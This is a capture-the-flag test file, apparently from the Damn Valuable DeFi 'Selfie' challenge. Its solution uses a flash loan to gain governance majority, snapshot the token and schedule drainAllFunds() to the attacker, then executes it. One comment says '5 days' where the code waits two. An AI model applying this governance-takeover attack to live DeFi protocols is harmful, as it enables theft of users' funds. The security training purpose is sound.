const {
    ethers
} = require('hardhat');
const {
    expect
} = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    /**
     * @dev
     * Exploit Overview
     * 
     * This exploit works but again leveraging a flash loan to temporarily
     * increase our ownership in the DVT token to > 50% so that we can 
     * schedule an action to execute.
     * 
     * Since anyone can execute a snapshot() on the token, we can run this just
     * after running collecting the loan and just before running schedule action.
     * 
     * The action that we schedule is to drainAllFunds() to the attacker account
     * from the lending pool. This can only be called by the governance contract
     * which is fine since we are scheduling the action!
     * 
     * So the exploit goes
     * 
     * 1. Deploy SC
     * 2. Run attack() function which requests a flash loan from the pool with the entire amount
     * 3. SC receives flash loan amount
     * 4. SC requests a snapshot of the ERC20 token
     * 5. SC queues action to drainAllFunds() with >50% token balance (at the time)
     * 6. SC Returns funds to lending pool
     * 7. Wait waiting period of 5 days
     * 8. Attacker runs execute action on action ID (ID is tracked in the contract and starts with 1)
     * 9. Funds are transferred to the attacker.
     * 
     * Exploit contract is available at:
     * "contracts/attacker-contracts/AttackSelfie.sol"
     */
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const AttackFactory = await ethers.getContractFactory("AttackSelfie", attacker);
        const attackContract = await AttackFactory.deploy(this.pool.address, this.token.address, attacker.address);

        await attackContract.attack();
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days

        const attackGovernenceContract = this.governance.connect(attacker);
        await attackGovernenceContract.executeAction(1);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});